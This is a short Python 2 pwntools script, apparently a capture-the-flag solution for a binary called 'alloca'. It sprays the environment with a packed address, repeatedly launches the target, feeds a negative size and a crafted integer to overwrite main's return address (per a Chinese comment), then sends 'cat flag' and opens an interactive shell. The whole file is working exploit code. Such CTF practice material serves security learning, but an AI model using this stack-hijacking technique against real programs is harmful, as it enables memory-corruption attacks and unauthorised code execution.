#!/usr/bin/python2
from pwn import *
import struct

# context.log_level='debug'

addr = p32(0x85ab0804)
argmax = 2097152
hey = addr*(argmax//256+999)

env={hey:hey}

while True:
    if True:
        p = process(executable="./alloca", argv=[], env=env)
    else:
        p = process(executable="/home/alloca/alloca", argv=[], env=env)
    # print(p.recv())

    # main函数的返回地址被设置为0xfff96d94
    p.sendline("-80")
    p.sendline(str(struct.unpack('<i', struct.pack('<I', 0xfff96d98))[0]))
    # print(p.recv())
    p.recvuntil("buffer????\n")
    p.sendline('cat flag')
    try:
        p.recv()
        p.interactive()
    except:
        pass